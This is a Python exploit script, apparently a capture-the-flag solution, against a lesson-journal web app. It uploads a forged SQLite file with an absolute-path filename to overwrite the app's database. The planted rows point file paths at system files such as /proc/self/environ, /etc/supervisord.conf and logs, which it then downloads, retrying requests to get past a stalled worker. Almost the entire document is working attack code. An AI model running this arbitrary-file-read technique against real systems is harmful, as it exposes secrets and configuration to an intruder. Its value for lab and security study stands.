#!/usr/bin/env python3
"""Uroki journal - abs-path upload -> arbitrary file read. Stdlib only, with retries.

    python3 discover.py http://HOST

Why retries: create_lesson() calls supervisorctl synchronously; the live instance's
gunicorn has 2 workers, and one of them is stuck in that call, so ~half of the
requests time out. Every request is retried on a fresh connection.

Two rounds:
  1. /entrypoint.sh (the file missing from the archive) + obvious flag paths + logs
  2. any "/...flag..." path found in round-1 output is read in a second injection
"""

import http.client
import json
import os
import re
import sqlite3
import sys
import tempfile
import time
import uuid
from urllib.parse import urlencode, urlparse

SCHEMA = """CREATE TABLE lessons (id INTEGER PRIMARY KEY AUTOINCREMENT,title TEXT,subject TEXT,
teacher TEXT,scheduled_at INTEGER,status TEXT DEFAULT 'planned',homework TEXT,file_name TEXT,
file_path TEXT,created_at INTEGER);
CREATE TABLE comments (id INTEGER PRIMARY KEY AUTOINCREMENT,lesson_id INTEGER,author TEXT,
body TEXT,created_at INTEGER);"""

ROUND1 = ["/entrypoint.sh", "/proc/1/cmdline", "/proc/self/environ", "/flag.txt", "/flag",
          "/flag/flag.txt", "/data/web.err.log", "/data/worker.err.log", "/logs/flag.txt",
          "/srv/flag.txt", "/app/flag.txt", "/etc/supervisord.conf"]


class Target:
    def __init__(self, base):
        u = urlparse(base)
        self.https = u.scheme == "https"
        self.host = u.hostname
        self.port = u.port or (443 if self.https else 80)

    def req(self, method, path, body=None, headers=None, tries=4, timeout=10):
        cls = http.client.HTTPSConnection if self.https else http.client.HTTPConnection
        last = None
        for _ in range(tries):
            try:
                c = cls(self.host, self.port, timeout=timeout)
                c.request(method, path, body, headers or {})
                r = c.getresponse()
                data = r.read()
                c.close()
                return r.status, dict(r.getheaders()), data
            except Exception as exc:  # timeout on the wedged worker
                last = exc
                time.sleep(0.7)
        return 0, {}, str(last).encode()


def inject(t, lesson_id, paths):
    """Overwrite /data/uroki.db so that lesson_id+n maps to paths[n]."""
    fd, db = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    con = sqlite3.connect(db)
    con.executescript(SCHEMA)
    con.execute("INSERT INTO lessons(id,title,subject,teacher,scheduled_at,file_path,created_at)"
                " VALUES(?,?,?,?,?,?,?)", (lesson_id, "x", "x", "x", 0, "/data/uroki.db", 0))
    for n, path in enumerate(paths):
        con.execute("INSERT INTO lessons(id,title,subject,teacher,scheduled_at,file_path,created_at)"
                    " VALUES(?,?,?,?,?,?,?)", (lesson_id + 1 + n, "x", "x", "x", 0, path, 0))
    con.commit()
    con.close()

    boundary = "----x" + uuid.uuid4().hex
    with open(db, "rb") as fh:
        payload = fh.read()
    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
            f'filename="/data/uroki.db"\r\n\r\n').encode() + payload + \
           f"\r\n--{boundary}--\r\n".encode()
    status, _, _ = t.req("POST", f"/lesson/{lesson_id}/upload", body,
                         {"Content-Type": f"multipart/form-data; boundary={boundary}"})
    print(f"[*] inject {len(paths)} paths -> HTTP {status}")
    return status


def read(t, lesson_id, paths):
    out = {}
    for n, path in enumerate(paths):
        status, _, body = t.req("GET", f"/lesson/{lesson_id + 1 + n}/file")
        text = body.decode("utf-8", "replace")
        out[path] = (status, text)
        print(f"\n== {path} -> {status}")
        if status == 200 and text.strip():
            print(text[:800])
    return out


def flag_of(text):
    m = re.search(r"ctfcup\{[^}]*\}", text)
    return m.group(0) if m else None


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    t = Target(base)

    status, _, body = t.req("GET", "/api/lessons.json")
    ids = [r["id"] for r in json.loads(body)] if status == 200 and body[:1] == b"[" else []
    print(f"[*] lessons: {ids}")
    if not ids:
        # upload_attachment() requires an existing row; creating a lesson also
        # triggers supervisorctl, so this is only done when the DB is empty
        form = urlencode({"title": "A", "subject": "M", "teacher": "I",
                          "date": "2030-01-01", "time": "10:00"}).encode()
        st, hd, _ = t.req("POST", "/lesson", form,
                          {"Content-Type": "application/x-www-form-urlencoded"})
        loc = hd.get("Location", "")
        anchor = int(re.search(r"/lesson/(\d+)", loc).group(1)) if loc else 1
        print(f"[*] created lesson {anchor} (HTTP {st})")
    else:
        anchor = ids[0]

    inject(t, anchor, ROUND1)
    results = read(t, anchor, ROUND1)
    text = "\n".join(v[1] for v in results.values())

    hit = flag_of(text)
    if hit:
        print(f"\n[+] FLAG: {hit}")
        return 0

    extra = sorted({p for p in re.findall(r"/[\w./-]*flag[\w./-]*", text) if p not in ROUND1})[:6]
    if extra:
        print(f"\n[*] round 2: {extra}")
        inject(t, anchor, extra)
        results = read(t, anchor, extra)
        hit = flag_of("\n".join(v[1] for v in results.values()))
        if hit:
            print(f"\n[+] FLAG: {hit}")
            return 0

    print("\n[-] flag not found; send the whole output back")
    return 1


if __name__ == "__main__":
    sys.exit(main())
